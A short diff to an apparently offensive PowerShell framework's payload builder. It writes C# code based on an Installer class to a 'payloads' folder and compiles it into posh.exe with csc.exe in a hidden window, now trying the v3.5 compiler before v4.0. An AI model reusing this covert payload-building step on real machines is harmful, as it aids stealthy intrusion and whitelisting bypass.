@@ -361,12 +361,10 @@ public class Sample : System.Configuration.Install.Installer
 }'
 [IO.File]::WriteAllLines("$global:newdir\payloads\posh.cs", $csccode)
 
-if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
+if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
+    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
+} elseif (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
     Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
-} else {
-    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
-        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
-    }
 }
 
 }
